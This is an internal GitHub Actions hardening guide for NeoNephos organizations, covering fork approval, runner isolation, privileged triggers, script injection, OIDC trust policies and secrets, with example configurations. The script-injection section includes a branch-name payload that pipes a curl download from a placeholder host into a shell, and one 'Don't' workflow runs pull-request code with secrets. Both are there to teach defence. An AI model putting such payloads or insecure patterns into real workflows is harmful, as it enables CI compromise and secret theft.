# NeoNephos GitHub Actions Hardening Guide

This guide explains the GitHub Actions baseline we are rolling out across all NeoNephos organizations. It covers **what** to change, **why** it matters, and **how** to do it, with copy-paste examples.

**Audience:** org owners, repository maintainers, and anyone who writes workflows.
**Target date:** end of next week for the organization settings (Part 1); workflow changes (Part 3) as soon as practical.

---

## Contents

- [Quick checklist](#quick-checklist)
- [Part 1: Organization settings](#part-1-organization-settings)
- [Part 2: Runners](#part-2-runners)
- [Part 3: Workflow files](#part-3-workflow-files)
- [Part 4: Cloud and token federation (OIDC)](#part-4-cloud-and-token-federation-oidc)
- [Part 5: Secrets](#part-5-secrets)
- [Part 6: Housekeeping](#part-6-housekeeping)
- [Part 7: Tooling](#part-7-tooling)
- [FAQ](#faq)

---

## Quick checklist

| # | Area | Action | Who |
|---|------|--------|-----|
| 1 | Org settings | Fork PR workflows: **require approval for all external contributors** | Org owner |
| 2 | Org settings | Default `GITHUB_TOKEN` **read-only**; turn off "Allow GitHub Actions to create and approve pull requests" | Org owner |
| 3 | Org settings | Allowed actions: GitHub-owned + verified creators + explicit allowlist; require SHA pinning | Org owner |
| 4 | Runners | No self-hosted or larger runners for fork PRs; runner groups not shared with public repos | Org owner |
| 5 | Workflows | No PR code checkout/execution in `pull_request_target`, `issue_comment`, `workflow_run` | Maintainers |
| 6 | Workflows | Comment commands (`/test`, `/deploy`, …) check maintainer status | Maintainers |
| 7 | Workflows | Untrusted input via `env:`, never inline `${{ }}` in `run:` | Maintainers |
| 8 | Workflows | Top-level `permissions:` in every workflow; `id-token: write` only where needed | Maintainers |
| 9 | Workflows | Actions and reusable workflows pinned to full commit SHA | Maintainers |
| 10 | OIDC | Trust policies pinned to exact repo + branch/environment; no wildcards | Cloud / platform owners |
| 11 | Secrets | Environment-scoped secrets with required reviewers for deploy credentials | Maintainers |
| 12 | Housekeeping | Turn off Actions in archived/mirror/fork repos; remove unused secrets and runners | Org owner / maintainers |

---

## Part 1: Organization settings

All under **Organization → Settings → Actions → General**. Repository-level settings can only be stricter than the org setting.

### 1.1 Approval for fork pull request workflows

**Set:** *Require approval for all external contributors*.

**Why:** With the weaker defaults, a workflow file submitted in a pull request from a fork can run on the first push without anyone looking at it. Requiring approval means a maintainer sees the diff (especially `.github/workflows/**`) before any CI runs.

**Before approving a run, look at:**
- changes under `.github/workflows/`, `.github/actions/`, `Makefile`, `hack/`, `scripts/`, `package.json` scripts, `go:generate` directives, Dockerfiles
- new dependencies or download URLs
- anything that touches the network, credentials, or cloud metadata endpoints

> ⚠️ This setting gates `pull_request` workflows only. It does **not** gate `pull_request_target`, `issue_comment` or `workflow_run`, which always run. See [3.1](#31-privileged-triggers).

### 1.2 Default workflow permissions

**Set:**
- *Workflow permissions* → **Read repository contents and packages permissions**
- **Untick** *Allow GitHub Actions to create and approve pull requests*

Workflows that need more must declare it explicitly (see [3.4](#34-least-privilege-permissions)).

### 1.3 Allowed actions and reusable workflows

**Set:** *Allow enterprise, and select non-enterprise, actions and reusable workflows*:
- ✅ Allow actions created by GitHub
- ✅ Allow actions by Marketplace verified creators
- Explicit allowlist for everything else, e.g. `aquasecurity/trivy-action@*`, `golangci/golangci-lint-action@*`
- ✅ **Require actions to be pinned to a full-length commit SHA** (where available)

### 1.4 Other org settings worth checking

- **Member privileges → Repository creation:** limit public repository creation to org owners if not needed.
- **Authentication security:** require two-factor authentication.
- **Repository → Rulesets:** protect default and release branches (no force push, required reviews). Protect release tags.

---

## Part 2: Runners

### 2.1 Principles

- **Fork PRs run on GitHub-hosted standard runners only.** Never on self-hosted, and never on paid larger runners.
- Self-hosted runners serve **trusted workflows on protected branches** (push to `main`/release, `workflow_dispatch` by maintainers, scheduled jobs).
- Prefer **ephemeral** self-hosted runners (one job per VM/pod, e.g. Actions Runner Controller with `ephemeral: true`).

### 2.2 Runner group settings

**Organization → Settings → Actions → Runner groups**, per group:
- **Untick** *Allow public repositories* unless strictly needed.
- *Repository access*: selected repositories only.
- *Workflow access*: **selected workflows** pinned to protected refs, e.g. `my-org/my-repo/.github/workflows/release.yaml@refs/heads/main`.

### 2.3 Guarding jobs that use special runners

If a workflow triggered by `pull_request` uses a self-hosted or larger runner, restrict that job to same-repository branches:

```yaml
jobs:
  integration:
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: [self-hosted, my-label]
```

Fork contributions then run only the jobs on GitHub-hosted runners; maintainers can re-run the special job from a same-repo branch after review.

### 2.4 Host hardening for self-hosted runners

- Ephemeral: fresh VM/container per job, no state carried across jobs.
- Cloud metadata: IMDSv2 with hop limit 1 (AWS) or equivalent; no instance role with broad permissions.
- No passwordless `sudo`, no mounted Docker socket, no host network.
- Egress: default-deny, allow GitHub, package registries and the services the job needs.
- No long-lived credentials on the host (kubeconfigs, SSH keys, cloud CLI profiles).
- Logs and process monitoring forwarded to central logging.

---

## Part 3: Workflow files

### 3.1 Privileged triggers

These triggers run **in the context of the base repository**, with its secrets and a potentially writable `GITHUB_TOKEN`, even for pull requests from forks:

| Trigger | Runs with base repo secrets | Gated by fork approval |
|---|---|---|
| `pull_request` (from fork) | ❌ | ✅ |
| `pull_request_target` | ✅ | ❌ |
| `issue_comment` | ✅ | ❌ |
| `workflow_run` | ✅ | ❌ |

**Rule:** in these workflows, **do not check out or run code from the pull request** while secrets, `id-token: write` or a write token are available.

❌ **Don't**

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # PR code …
      - run: make test                                   # … executed with secrets
        env:
          TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

✅ **Do: split into an unprivileged build and a privileged follow-up**

```yaml
# .github/workflows/pr.yaml: untrusted, no secrets
on: pull_request
permissions: { contents: read }
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - run: make test
      - run: echo "${{ github.event.pull_request.number }}" > pr-number
      - uses: actions/upload-artifact@<sha>
        with: { name: result, path: pr-number }
```

```yaml
# .github/workflows/pr-comment.yaml: privileged, never runs PR code
on:
  workflow_run:
    workflows: [pr]
    types: [completed]
permissions: { pull-requests: write }
jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@<sha>
        with: { name: result, run-id: ${{ github.event.workflow_run.id }}, github-token: ${{ github.token }} }
      - name: Validate artifact (treat as untrusted data)
        run: |
          read -r pr < pr-number
          [[ "$pr" =~ ^[0-9]+$ ]] || { echo "invalid"; exit 1; }
          echo "PR=$pr" >> "$GITHUB_ENV"
      # … use $PR as data only
```

If you genuinely need secrets against PR code (e.g. integration tests against a real cloud):
- trigger only on an explicit maintainer action (a label added by a maintainer, or a maintainer comment),
- pin the checkout to the **exact SHA that was reviewed** and abort if the PR head moved,
- remove the trigger label after each run so new pushes require a fresh review,
- run the secret-bearing job in a GitHub **environment with required reviewers**,
- use credentials scoped to a disposable test account/project.

### 3.2 Comment commands (ChatOps)

Anyone with a GitHub account can comment on a public PR. Check the commenter before doing anything privileged:

```yaml
on:
  issue_comment:
    types: [created]
jobs:
  run:
    if: >-
      github.event.issue.pull_request &&
      startsWith(github.event.comment.body, '/test') &&
      contains(fromJSON('["OWNER","MEMBER","COLLABORATOR"]'), github.event.comment.author_association)
    runs-on: ubuntu-latest
```

For stricter control, check team membership via the API, or check an `OWNERS`/`CODEOWNERS` file read **from the default branch**, not from the PR.

Also verify that the PR comes from the same repository, or pin to the reviewed SHA, before checking out code.

### 3.3 Script injection

`${{ }}` expressions are substituted **before** the shell runs. Attacker-controlled values become code.

**Untrusted values include:** `github.event.pull_request.title`, `.body`, `.head.ref`, `.head.label`, `github.head_ref`, `github.event.issue.title`/`.body`, `github.event.comment.body`, `github.event.review.body`, commit messages, branch names, file contents from the PR.

❌ **Don't**

```yaml
- run: echo "Building branch ${{ github.event.pull_request.head.ref }}"
```

A branch named `a";curl${IFS}https://example.invalid/x|sh;"` executes arbitrary commands.

✅ **Do**

```yaml
- run: echo "Building branch ${HEAD_REF}"
  env:
    HEAD_REF: ${{ github.event.pull_request.head.ref }}
```

The same applies to `actions/github-script`: read values from `process.env` or `context.payload`, not via `${{ }}` inside the `script:` string.

### 3.4 Least-privilege permissions

Add a restrictive top-level block to **every** workflow and widen per job:

```yaml
permissions:
  contents: read

jobs:
  release:
    permissions:
      contents: write
      id-token: write   # only for the job that signs or federates
```

- `id-token: write` only in jobs that exchange OIDC tokens.
- Avoid `permissions: write-all`.
- For `actions/checkout`, set `persist-credentials: false` unless a later step needs to push.

### 3.5 Pin actions and reusable workflows

❌ `uses: some-org/some-action@v2` / `@main` / `@master`
✅ `uses: some-org/some-action@8f4b7f84864484a7bf31766abe9204da3cbe65b3 # v2.3.1`

- Applies to **reusable workflows** too (`uses: org/repo/.github/workflows/x.yaml@<sha>`).
- Applies **transitively**: with *Require SHA pinning* enabled, every `uses:` inside a composite action (`action.yml`), local action (`./.github/actions/...`) or reusable workflow you call must be pinned as well. Pinning only your own workflow file is not enough.
- Shared internal workflows/actions: if you can't pin, at minimum protect the branch and tags they're consumed from (required reviews, no force push, tag protection).
- Let Renovate or Dependabot keep SHA pins current (see [Part 7](#part-7-tooling)).

#### Troubleshooting "must be pinned to a full-length commit SHA"

```text
The action actions/setup-node@v4 is not allowed in my-org/my-repo because all actions must be pinned to a full-length commit SHA.
```

Your workflow file is already pinned but the job still fails? Check, in order:

1. **Which action does the error name?** If it is not in your workflow file, it comes from a nested `uses:` in a composite action or reusable workflow you call:

   ```yaml
   # your workflow: pinned
   - uses: some-org/setup-tool@<sha> # v1.2.0

   # action.yml in some-org/setup-tool: not pinned → blocked
   runs:
     using: composite
     steps:
       - uses: actions/setup-node@v4
   ```

   Fix it where the reference lives: pin inside the action/workflow, then bump the SHA you consume. For external actions, open an issue/PR upstream, switch to an alternative that pins, or fork it into the org and pin there.
2. **Which commit did the run use?** A run uses the workflow file from the commit it was triggered on. "Re-run" of an old run, branches/PRs not yet rebased onto the pinning commit, and release branches keep failing. Check the commit in the run summary; rebase or merge, then trigger a fresh run.

### 3.6 Caches and artifacts

- Caches written by PR runs can be restored by privileged runs on the same key prefix. Don't restore caches in release/deploy jobs, or use distinct keys.
- Treat artifacts downloaded from another run as **untrusted data**: validate, don't execute.

### 3.7 Code owners for CI files

Add a `CODEOWNERS` entry so workflow changes always get a maintainer review:

```
/.github/            @my-org/my-repo-maintainers
/Makefile            @my-org/my-repo-maintainers
/hack/               @my-org/my-repo-maintainers
```

---

## Part 4: Cloud and token federation (OIDC)

OIDC removes long-lived cloud keys, but only if the trust policy is narrow. A loosely configured trust lets **any workflow in any repo** (or any branch, including PR refs) obtain credentials.

### 4.1 Rules

- Match the **exact repository** and a **protected branch or environment**.
- **No wildcards** in subject conditions (`repo:my-org/*`, `repo:my-org/my-repo:*`).
- Do not trust subjects from pull requests (`:pull_request`) for anything with write access.
- Scope the cloud role to the minimum permissions for that one workflow.
- Prefer environment-based subjects (`environment:prod`) combined with **required reviewers** on that environment.

### 4.2 Examples

**AWS IAM role trust policy**

```json
"Condition": {
  "StringEquals": {
    "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
    "token.actions.githubusercontent.com:sub": "repo:my-org/my-repo:environment:prod"
  }
}
```

**GCP Workload Identity Federation (attribute condition)**

```
assertion.repository == "my-org/my-repo" &&
assertion.ref == "refs/heads/main"
```

**Azure federated credential**

- Entity type: *Environment* → `prod` (or *Branch* → `main`)
- Never a federated credential for *Pull request*.

### 4.3 Internal token services

If your org uses a service that exchanges GitHub OIDC tokens for GitHub or other tokens, apply the same rules to its policy file:
- every entry pins repository **and** ref/environment,
- every entry lists explicit `permissions` and `repositories` (an empty list often means "everything"),
- changes to the policy file require review by org owners.

### 4.4 Optional: customize the OIDC subject

Including `job_workflow_ref` in the subject lets you trust one specific workflow file:

```bash
gh api -X PUT repos/my-org/my-repo/actions/oidc/customization/sub \
  -f use_default=false -F 'include_claim_keys[]=repo' -F 'include_claim_keys[]=context' -F 'include_claim_keys[]=job_workflow_ref'
```

---

## Part 5: Secrets

- Put deploy and release credentials in **environment secrets**, with **required reviewers** and **deployment branch rules** (`main`, `release-*`).
- Avoid `secrets: inherit` in reusable workflow calls; pass only what the callee needs.
- Prefer OIDC over static cloud keys; prefer GitHub Apps with narrow permissions over personal access tokens.
- Rotate any secret that was ever exposed to a workflow that ran PR code.
- Remove secrets that are no longer used (**Settings → Secrets and variables → Actions**).

---

## Part 6: Housekeeping

- **Archived repos, mirrors, forks of upstream projects:** turn off Actions (**Settings → Actions → General → Disable actions**) or delete inherited upstream workflows that don't apply.
- **Unused self-hosted runners:** remove them; check runner groups for stale repository access.
- **Organization variables** that influence CI (runner selection, label names, token-server URLs): make sure only org owners can change them, and review their current values.
- **Branch and tag protection** on default and release branches, and on repos that host shared actions/reusable workflows.

---

## Part 7: Tooling

### Static analysis of workflows

[`zizmor`](https://github.com/zizmorcore/zizmor) finds most issues covered in this guide:

```bash
pipx install zizmor        # or: brew install zizmor
zizmor .github/workflows/
```

Run it in CI:

```yaml
name: workflow-lint
on:
  pull_request:
    paths: ['.github/**']
permissions: { contents: read }
jobs:
  zizmor:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
        with: { persist-credentials: false }
      - run: pipx run zizmor --format=github .github/workflows/
```

Other useful tools: [`actionlint`](https://github.com/rhysd/actionlint), [OpenSSF Scorecard](https://github.com/ossf/scorecard).

### Keeping SHA pins current

**Renovate**

```json
{
  "extends": ["config:recommended", "helpers:pinGitHubActionDigests"]
}
```

**Dependabot**

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule: { interval: weekly }
```

### Quick self-check (from a repo checkout)

```bash
# privileged triggers
grep -rlE 'pull_request_target|issue_comment|workflow_run' .github/workflows/

# PR head checkout inside those workflows
grep -rnE 'head\.(sha|ref)|refs/pull/|gh pr checkout' .github/workflows/

# inline untrusted expressions
grep -rnE '\$\{\{ *github\.(event\.(pull_request|issue|comment|review)\.(title|body|head\.ref)|head_ref)' .github/workflows/

# unpinned third-party actions
grep -rhoE 'uses: *[^ ]+@[^ ]+' .github/workflows/ | grep -vE '@[0-9a-f]{40}' | grep -vE 'uses: *(actions|github)/|uses: *\./'

# self-hosted / custom runners
grep -rnE 'runs-on:.*self-hosted' .github/workflows/
```

---

## FAQ

**Will requiring approval slow down contributors?**
Only for first contributions from outside collaborators: a maintainer clicks *Approve and run* once per push. Regular contributors can be added as collaborators.

**We need secrets for integration tests on PRs. What now?**
Use the pattern in [3.1](#31-privileged-triggers): maintainer-triggered, pinned to the reviewed SHA, label removed after each run, environment with required reviewers, disposable test credentials.

**Is `pull_request_target` always wrong?**
No. It's fine for labeling, commenting and triage, as long as it never checks out or executes PR content.

**Our org setting already looks right. Anything else?**
Workflow-level issues ([Part 3](#part-3-workflow-files)) and OIDC trust policies ([Part 4](#part-4-cloud-and-token-federation-oidc)) are independent of org settings. Please still run the self-check.

**Who can help?**
Contact the NeoNephos enterprise admins. We're happy to review workflows with you.

---

### References

- [GitHub Docs: Security hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs: Approving workflow runs from forks](https://docs.github.com/en/actions/managing-workflow-runs-and-deployments/managing-workflow-runs/approving-workflow-runs-from-public-forks)
- [GitHub Docs: OpenID Connect](https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/)
- [GitHub Security Lab: Untrusted input](https://securitylab.github.com/resources/github-actions-untrusted-input/)
